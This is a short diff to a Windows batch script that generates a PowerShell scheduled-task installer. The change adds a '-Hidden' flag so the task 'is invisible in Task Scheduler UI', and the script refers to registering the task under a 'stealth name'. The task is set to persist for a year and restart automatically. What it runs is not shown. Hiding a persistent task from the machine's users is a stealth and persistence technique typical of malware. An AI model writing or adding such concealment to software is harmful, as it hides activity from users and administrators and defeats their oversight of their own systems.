@@ -642,7 +642,7 @@ echo # Principal: Built-in Users group ^(S-1-5-32-545^)
 echo # This avoids account name/SID resolution issues on newer Windows builds.
 echo $principal = New-ScheduledTaskPrincipal -GroupId "S-1-5-32-545" -RunLevel Limited
 echo.
-echo # Settings
+echo # Settings - Hidden makes task invisible in Task Scheduler UI
 echo $settings = New-ScheduledTaskSettingsSet `
 echo     -AllowStartIfOnBatteries `
 echo     -DontStopIfGoingOnBatteries `
@@ -650,7 +650,8 @@ echo     -StartWhenAvailable `
 echo     -MultipleInstances IgnoreNew `
 echo     -ExecutionTimeLimit ^(New-TimeSpan -Days 365^) `
 echo     -RestartCount 3 `
-echo     -RestartInterval ^(New-TimeSpan -Minutes 5^)
+echo     -RestartInterval ^(New-TimeSpan -Minutes 5^) `
+echo     -Hidden
 echo.
 echo # Register task with stealth name
 echo try {
